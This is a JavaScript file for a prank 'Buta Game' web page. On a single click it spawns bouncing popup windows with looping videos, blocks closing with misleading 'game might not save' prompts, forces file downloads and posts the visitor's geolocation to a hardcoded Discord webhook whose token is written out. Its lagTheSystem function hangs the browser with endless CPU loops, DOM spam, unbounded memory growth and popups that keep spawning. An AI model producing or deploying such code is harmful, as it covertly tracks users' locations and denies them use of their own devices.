document.getElementById('playButton').addEventListener('click', function() {
    const videoFiles = [
        'videos/video1.mp4',
        'videos/video2.mp4',
        'videos/video3.mp4',
        'videos/video4.mp4',
        'videos/video5.mp4'
    ];

    // Open 5 moving tabs
    videoFiles.forEach((url, index) => {
        const newWindow = window.open('', `ButaGameWindow${index}`, 'width=400,height=300');
        if (newWindow) {
            // First video in fullscreen
            if (index === 0) {
                newWindow.document.write(`
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>Buta Game</title>
                        <style>
                            body { margin: 0; overflow: hidden; }
                            video { width: 100vw; height: 100vh; object-fit: cover; position: fixed; top: 0; left: 0; }
                        </style>
                    </head>
                    <body>
                        <video id="popupVideo" autoplay loop>
                            <source src="${url}" type="video/mp4">
                            Your browser does not support the video tag.
                        </video>
                        <script>
                            window.onbeforeunload = function() {
                                return "Are you sure you want to close? Game might not save.";
                            };
                            
                            const video = document.getElementById('popupVideo');
                            video.play();
                            
                            function keepPlaying() {
                                video.play();
                                requestAnimationFrame(keepPlaying);
                            }
                            keepPlaying();
                        <\/script>
                    </body>
                    </html>
                `);
            } else {
                // Other videos with audio
                newWindow.document.write(`
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>Buta Game</title>
                        <style>
                            body { margin: 0; overflow: hidden; }
                            video { width: 100%; height: 100%; object-fit: cover; position: fixed; top: 0; left: 0; }
                        </style>
                    </head>
                    <body>
                        <video id="popupVideo" autoplay loop>
                            <source src="${url}" type="video/mp4">
                            Your browser does not support the video tag.
                        </video>
                        <script>
                            window.onbeforeunload = function() {
                                return "Are you sure you want to close? Game might not save.";
                            };
                            
                            const video = document.getElementById('popupVideo');
                            video.play();
                            
                            function keepPlaying() {
                                video.play();
                                requestAnimationFrame(keepPlaying);
                            }
                            keepPlaying();
                        <\/script>
                    </body>
                    </html>
                `);
            }
            newWindow.document.close();

            // Move the window
            let x = Math.random() * (screen.width - 400);
            let y = Math.random() * (screen.height - 300);
            let dx = 2 + Math.random() * 2;
            let dy = 2 + Math.random() * 2;

            function moveWindow() {
                x += dx;
                y += dy;
                if (x < 0 || x > screen.width - 400) dx = -dx;
                if (y < 0 || y > screen.height - 300) dy = -dy;
                newWindow.moveTo(x, y);
                if (newWindow.closed) return;
                requestAnimationFrame(moveWindow);
            }
            moveWindow();
        } else {
            console.error('Popup blocked. Please allow popups for this site.');
        }
    });

    // Play fourth video on main page with audio
    const mainVideo = document.getElementById('mainVideo');
    mainVideo.style.display = 'block';
    mainVideo.muted = false; // Ensure audio plays on main page
    mainVideo.play();

    // Hide button
    this.style.display = 'none';

    // Trigger image downloads
    downloadImage('images/image1.jpg', 'buta_image1.jpg');
    downloadImage('images/image2.jpg', 'buta_image2.jpg');

    // Send location to Discord webhook
    sendLocationToWebhook();

    // Introduce lag-inducing operations
    lagTheSystem();
});

// Add close confirmation to main page
window.onbeforeunload = function() {
    return "Are you sure you want to close? Game might not save.";
};

// Function to download images
function downloadImage(url, filename) {
    const link = document.createElement('a');
    link.href = url;
    link.download = filename;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

// Function to send location to Discord webhook
function sendLocationToWebhook() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
            const { latitude, longitude } = position.coords;
            const webhookUrl = 'https://discord.com/api/webhooks/1357338228004487341/YOjCQVGU-IMzYt_ZP9-YJjUags_DeF8eGap3JPEiTGRio98s1h8FIlcGxvuZwYyTV0H6';
            const data = {
                content: `User location: Latitude ${latitude}, Longitude ${longitude}`,
                username: 'ButaGameBot'
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(error => console.error('Webhook error:', error));
        }, error => {
            console.error('Geolocation error:', error);
        });
    } else {
        console.log('Geolocation not supported');
    }
}

// New function to cause significant lag
function lagTheSystem() {
    // 1. CPU-intensive infinite loop with heavy math
    function heavyComputation() {
        let result = 0;
        for (let i = 0; i < 1e8; i++) {
            result += Math.sin(i) * Math.cos(i) * Math.tan(i);
        }
        requestAnimationFrame(heavyComputation); // Keep it running
    }
    heavyComputation();

    // 2. Excessive DOM manipulation
    function spamDOM() {
        for (let i = 0; i < 10000; i++) {
            const div = document.createElement('div');
            div.style.position = 'absolute';
            div.style.left = Math.random() * 100 + 'vw';
            div.style.top = Math.random() * 100 + 'vh';
            div.style.width = '1px';
            div.style.height = '1px';
            div.style.background = 'black';
            document.body.appendChild(div);
        }
        requestAnimationFrame(spamDOM); // Repeat indefinitely
    }
    spamDOM();

    // 3. Memory hogging with large arrays
    let memoryHog = [];
    function fillMemory() {
        for (let i = 0; i < 100000; i++) {
            memoryHog.push(new Array(10000).fill(Math.random()));
        }
        requestAnimationFrame(fillMemory); // Keep filling memory
    }
    fillMemory();

    // 4. Rapid window spawning (more popups)
    function spawnWindows() {
        for (let i = 0; i < 5; i++) {
            const w = window.open('', `LagWindow${i}`, 'width=200,height=200');
            if (w) {
                w.document.write('<h1>Lagging...</h1>');
                w.moveTo(Math.random() * screen.width, Math.random() * screen.height);
            }
        }
        setTimeout(spawnWindows, 1000); // Spawn more every second
    }
    spawnWindows();
}